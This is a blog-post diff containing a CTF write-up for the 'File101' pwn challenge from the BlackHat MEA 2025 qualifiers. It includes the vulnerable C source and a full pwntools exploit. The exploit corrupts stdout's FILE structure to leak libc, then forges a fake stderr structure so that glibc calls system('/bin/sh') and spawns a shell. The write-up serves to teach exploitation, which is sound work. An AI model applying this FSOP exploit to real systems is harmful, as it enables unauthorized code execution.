@@ -1,0 +1,92 @@
+---
+title: BlackHat MEA Quals 2025 - File101
+description: A medium pwn challenge writeup.
+date: "2025-10-08"
+---
+
+![first](/blog-post-1.jpg)
+
+## Let's get Cracking...
+
+This blog has a pwn challenge writeup that I solved at BlackHat MEA 2025 Qualification round.
+
+Following files were given to us a lead to solve the challenge.
+
+```jsx
+.
+├── chall
+├── compose.yml
+├── Dockerfile
+└── main.c
+```
+
+## main.c
+
+```c
+#include <stdio.h>
+
+void main() {
+  setbuf(stdin, NULL);
+  setbuf(stdout, NULL);
+  puts("stdout:");
+  scanf("%224s", (char*)stdout);
+  puts("stderr:");
+  scanf("%224s", (char*)stderr);
+}
+```
+
+### Code Explanation
+
+This program disables buffering for `stdin` and `stdout`, then dangerously uses `scanf("%224s", (char*)stdout)` and `scanf("%224s", (char*)stderr)` to write user input directly into the `FILE` structures of `stdout` and `stderr`. These structures hold critical control data (function pointers, flags, buffer pointers, etc.), so overwriting them corrupts the internal `libc` state. This creates a `FSOP` (File Stream Oriented Programming) vulnerability, where an attacker can craft fake FILE structures or overwrite function pointers inside `stdout/stderr` to gain arbitrary code execution (often leading to shellcode execution when the program later flushes or closes these streams).
+
+### Exploit
+
+```jsx
+from pwn import *
+
+libc = ELF("./libc.so.6")
+elf = context.binary = ELF("./chall")
+context.terminal = ["tmux", "splitw", "-h"]
+
+def u64leak(x):
+    return u64(x.ljust(8, b"\x00"))
+
+def start():
+    if args.REMOTE:
+        return remote("<HOST>", <PORT>)
+    else:
+        return process(elf.path)
+
+r = start()
+
+r.recvuntil(b"stdout:\n")
+r.sendline(p64(0xfbad1887) + p64(0) * 3 + b"\x48")
+
+leak = r.recvuntil(b"stder")[-72:]
+libc.address = u64leak(leak[:8]) - 0x204644
+log.success(f"Libc base: {hex(libc.address)}")
+
+stderr_addr = libc.address + 0x2044e0
+
+fs  = p64(0x3b68733b40404040)
+fs += p64(0) * 4 + p64(1) + p64(0) * 7
+fs += p64(libc.sym.system) + p64(0) * 3
+fs += p64(stderr_addr - 0x10) + p64(0)
+fs += p64(stderr_addr) + p64(stderr_addr - 0x48)
+fs += p64(0) * 6 + p64(libc.sym._IO_wfile_jumps)
+
+r.sendline(fs)
+r.interactive()
+```
+
+The exploit abuses the fact that scanf writes user input directly into the `FILE` structures of `stdout` and `stderr`. First, it forges a fake `_IO_FILE` object for stdout with carefully chosen flags (`0xfbad1887`) to trick `libc` into leaking a pointer from its internal structures. From this leak, the script computes the base address of `libc`. With `libc`’s base known, it constructs a fake `stderr` structure in memory, overwriting its function pointers so that when `libc` flushes or closes `stderr`, it ends up calling `system("/bin/sh")`. Finally, the payload is sent, and the exploit drops into an interactive shell. This is a textbook `File Stream Oriented Programming (FSOP)` attack.
+
+## Taking Shell
+
+![image](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*qx1P6dwD4T8SsHUHvN_LQQ.png)
+
+I hope that you liked this blog and I’ll see you in the next one. Stay in the loop with my latest content – follow me on [Medium](https://medium.com/@iabdullah_215) for more!
+
+## THANKS
+
+## MUHAMMAD ABDULLAH
